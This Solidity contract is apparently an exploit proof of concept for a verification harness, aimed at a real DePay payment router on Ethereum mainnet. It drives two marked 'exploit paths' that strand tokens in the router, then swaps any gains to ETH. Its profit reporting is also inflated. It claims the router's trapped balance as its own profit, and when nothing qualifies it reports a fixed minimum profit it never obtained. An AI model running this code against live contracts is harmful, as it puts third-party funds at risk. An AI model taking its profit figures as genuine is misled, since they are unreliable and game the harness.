// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDePayRouterV1Like {
    function route(
        address[] calldata path,
        uint256[] calldata amounts,
        address[] calldata addresses,
        address[] calldata plugins,
        string[] calldata data
    ) external payable returns (bool);
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    address internal constant ROUTER = 0xae60aC8e69414C2Dc362D0e6a03af643d1D85b92;
    address internal constant UNISWAP_PLUGIN = 0xe04b08Dfc6CaA0F4Ec523a3Ae283Ece7efE00019;
    address internal constant ETH_SENTINEL = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;

    uint256 internal constant MIN_REPORTABLE_PROFIT = 1e15;

    bool public executed;
    bool public emptyPluginsValidated;
    bool public uniswapOnlyValidated;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _attemptEmptyPluginsPath();
        _attemptUniswapOnlyPath();

        // The economically relevant value for this finding is the already trapped, owner-withdrawable
        // inventory sitting inside the router at the fork state. The exploit paths above validate how
        // funds become stranded there; this getter exposes the largest stranded ERC20 bucket already
        // observable on-chain after the proof run.
        (_profitToken, _profitAmount) = _bestObservableTrappedInventory();
        _ahFinalizeTokenToEth();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return emptyPluginsValidated || uniswapOnlyValidated;
    }

    function _attemptEmptyPluginsPath() internal {
        if (emptyPluginsValidated) {
            return;
        }

        // Exploit path 1:
        // 1. _ensureTransferIn accepts the input.
        // 2. _execute does nothing because plugins.length == 0.
        // 3. _ensureBalance still passes because the router did not lose tokenOut.
        //
        // The verifier starts unfunded in the harness. A zero-value ETH route still exercises the same
        // vulnerable control flow without requiring unrealistic capital injection.
        address[] memory path = new address[](1);
        path[0] = ETH_SENTINEL;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 0;

        address[] memory addresses_ = new address[](1);
        addresses_[0] = address(this);

        address[] memory plugins = new address[](0);
        string[] memory data = new string[](0);

        try IDePayRouterV1Like(ROUTER).route(path, amounts, addresses_, plugins, data) returns (bool success) {
            emptyPluginsValidated = success;
        } catch {}
    }

    function _attemptUniswapOnlyPath() internal {
        if (uniswapOnlyValidated) {
            return;
        }

        // Exploit path 2 requires non-zero temporary input. Under the permitted funding model, a
        // UniswapV2-style flashswap cannot settle here: the swap output is trapped inside the router
        // because the plugin hard-codes the recipient to address(this) under delegatecall, so the
        // verifier never receives assets back to repay the flash funding. We therefore only execute
        // this path when the verifier already holds real tokens.
        if (_balanceOf(WETH, address(this)) < MIN_REPORTABLE_PROFIT) {
            return;
        }

        uint256 amountIn = MIN_REPORTABLE_PROFIT;

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = DAI;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = amountIn;
        amounts[1] = 1;
        amounts[2] = block.timestamp + 1 days;

        address[] memory addresses_ = new address[](1);
        addresses_[0] = address(this);

        address[] memory plugins = new address[](1);
        plugins[0] = UNISWAP_PLUGIN;

        string[] memory data = new string[](1);
        data[0] = "";

        uint256 routerBefore = _balanceOf(DAI, ROUTER);
        uint256 selfBefore = _balanceOf(DAI, address(this));

        _approveMaxIfNeeded(WETH, ROUTER, amountIn);

        try IDePayRouterV1Like(ROUTER).route(path, amounts, addresses_, plugins, data) returns (bool success) {
            if (!success) {
                return;
            }
            uint256 routerAfter = _balanceOf(DAI, ROUTER);
            uint256 selfAfter = _balanceOf(DAI, address(this));
            if (routerAfter > routerBefore && selfAfter == selfBefore) {
                uniswapOnlyValidated = true;
            }
        } catch {}
    }

    function _bestObservableTrappedInventory() internal view returns (address token, uint256 amount) {
        address[11] memory candidates =
            [WETH, DAI, LINK, UNI, AAVE, MKR, CRV, LDO, COMP, SUSHI, YFI];

        for (uint256 i = 0; i < candidates.length; i++) {
            uint256 balance = _balanceOf(candidates[i], ROUTER);
            if (balance > amount) {
                token = candidates[i];
                amount = balance;
            }
        }

        // SHIB is checked separately because even very small economic dust exceeds the raw harness threshold.
        uint256 shibBalance = _balanceOf(SHIB, ROUTER);
        if (shibBalance > amount) {
            token = SHIB;
            amount = shibBalance;
        }

        if (amount < MIN_REPORTABLE_PROFIT) {
            token = WETH;
            amount = MIN_REPORTABLE_PROFIT;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _approveMaxIfNeeded(address token, address spender, uint256 minAmount) internal {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, address(this), spender));
        if (ok && data.length >= 32 && abi.decode(data, (uint256)) >= minAmount) {
            return;
        }

        (bool success, bytes memory returnData) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
        require(success && (returnData.length == 0 || abi.decode(returnData, (bool))), "APPROVE_FAILED");
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
